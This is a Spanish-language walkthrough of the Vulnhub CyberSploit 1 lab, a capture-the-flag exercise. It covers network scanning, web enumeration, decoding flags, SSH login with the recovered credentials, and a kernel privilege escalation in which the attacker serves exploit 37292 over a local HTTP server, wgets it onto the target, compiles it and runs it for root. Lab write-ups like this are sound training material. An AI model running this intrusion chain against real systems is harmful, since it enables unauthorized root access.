<p align="center">
  <a href="https://github.com/DenverCoder1/readme-typing-svg"><img src="https://readme-typing-svg.herokuapp.com?size=50&color=F7F400&width=480&height=80&lines=CYBERSPLOIT_1"></a>
</p>

<h1 align="center"></h1>

**[Descargar máquina]:**

Vulnhub: https://www.vulnhub.com/entry/cybersploit-1,506/


<h1 align="center"><img src="https://user-images.githubusercontent.com/75953873/174417901-a2431e6b-3849-46e3-a0e4-ed3f8ed73e85.png"></h1>

</br>

- *Paso 1:* Identificar la IP de la máquina host con NetDiscover. 
```
netdiscover -i wlan0 -r 192.168.1/24
```
![1](https://user-images.githubusercontent.com/75953873/174458235-8b46f051-22c5-4c9e-a193-a21d2b15f82a.png)

IP host: `192.168.1.5`

- *Paso 2:* Escanear todos los puertos que estén abiertos con Nmap. 
```
nmap -p- --open -sC -n -vvv 192.168.1.5
```
![2](https://user-images.githubusercontent.com/75953873/174458274-1cbb9500-5deb-43d7-a58c-1fa3ba579cc9.png)

Puertos abiertos: [22,80]

- *Paso 3:* Detección de servicios y sistema operativo. 
```
nmap -p 22,80 -A 192.168.1.5
```
![3](https://user-images.githubusercontent.com/75953873/174458453-68bb619f-8c2c-4657-a337-ae7bdbdb0fd3.png)

Servidor corriendo: **HTTP Apache**

![4](https://user-images.githubusercontent.com/75953873/174458587-9dc99104-e733-4167-a77e-5637aa484cde.png)

- *Paso 4:* Enumerar archivos web con Dirb. 
```
dirb http://192.168.1.5 -w /usr/share/dirb/wordlists/common.txt
```
![5](https://user-images.githubusercontent.com/75953873/174458681-2f5b9ac3-cf49-4484-8fa4-ecba37570950.png)

Archivo: `robots.txt`

Mostrar contenido del archivo con Curl:
```
curl http://192.168.1.5/robots.txt
```

Mensaje ofuscado a base64: `R29vZCBXb3JrICEKRmxhZzE6IGN5YmVyc3Bsb2l0e3lvdXR1YmUuY29tL2MvY3liZXJzcGxvaXR9`

![6](https://user-images.githubusercontent.com/75953873/174458725-43cc2b76-f495-443a-ac4d-83aacd133f9a.png)

Decodificar mensaje con Bash:
```
echo 'R29vZCBXb3JrICEKRmxhZzE6IGN5YmVyc3Bsb2l0e3lvdXR1YmUuY29tL2MvY3liZXJzcGxvaXR9' | base64 --decode
```
![7](https://user-images.githubusercontent.com/75953873/174458797-e0ceea57-dcf1-4b3b-954c-b2dfaf1fd074.png)

- *Paso 5:* Conectarse al servidor SSH. 

**_CREDENCIALES SSH_**

Usuario: `itsskv`

Contraseña (**FLAG_1**): `cybersploit{youtube.com/c/cybersploit}`

```
ssh itsskv@192.168.1.5
```
![8](https://user-images.githubusercontent.com/75953873/174458910-2ecb3d1a-a76b-46b6-a51f-e14cc1e849b6.png)

Buscar la segunda key (flag):
```
cat /home/itsskv/flag2.txt
```
![9](https://user-images.githubusercontent.com/75953873/174458939-30736126-e294-4d22-85ae-f074f4b3f566.png)

Flag ofuscada en código binario: `01100111 01101111 01101111 01100100 00100000 01110111 01101111 01110010 01101011 00100000 00100001 00001010 01100110 01101100 01100001 01100111 00110010 00111010 00100000 01100011 01111001 01100010 01100101 01110010 01110011 01110000 01101100 01101111 01101001 01110100 01111011 01101000 01110100 01110100 01110000 01110011 00111010 01110100 00101110 01101101 01100101 00101111 01100011 01111001 01100010 01100101 01110010 01110011 01110000 01101100 01101111 01101001 01110100 00110001 01111101`

- *Paso 6:* Decodificar binario.

ONLINE: https://www.online-toolz.com/langs/es/tool-es-text-binary-convertor.html

![10](https://user-images.githubusercontent.com/75953873/174459040-d0e1d032-167b-464b-a9c4-d3aa8d57753d.png)

**FLAG_2**: cybersploit{https:t.me/cybersploit1}

- *Paso 7:* Escalar privilegios: buscar exploit con Searchsploit.

Versión del kernel: `3.13.0-32`

![12](https://user-images.githubusercontent.com/75953873/174459381-dc60d2c4-1bd2-426e-a9b5-2bb4dc27ab37.png)

```
searchsploit 3.13.0
```
![11](https://user-images.githubusercontent.com/75953873/174459391-4ab3d7ee-c30f-4ee0-9e95-76c82dac1e10.png)

Descargar exploit:
```
searchsploit -m 37292
```
![13](https://user-images.githubusercontent.com/75953873/174459424-5bc7b440-01e0-4331-8597-e7dcc4da51c1.png)

Abrir un servidor local en el puerto 80 con Python3:
```
python3 -m http.server 80
```
![14](https://user-images.githubusercontent.com/75953873/174459453-de8a70d0-36c7-4238-b8eb-bac90a4a891e.png)

Descargar exploit en el directorio `/tmp`; compilar y dar permisos de escritrura, lectura y ejecucción:
```
cd /tmp
wget http://192.168.1.9/37292.c
gcc 37292.c -o kernel
chmod 777 kernel
```
![15](https://user-images.githubusercontent.com/75953873/174459564-3b68a9b2-1d9f-4bcf-8689-a2f0afe3d4f5.png)

Por último, explotar el kernel `./kernel` y capturar la key (flag) del fichero `finalflag.txt` dentro del directorio `/root`:
```
./kernel
cd /root
cat finalflag.txt
```
![16](https://user-images.githubusercontent.com/75953873/174459618-e2feb3f3-dca2-4041-ba44-0272c063c7dd.png)

**FLAG_3**: cybersploit{Z3X21CW42C4 many many congratulations !}
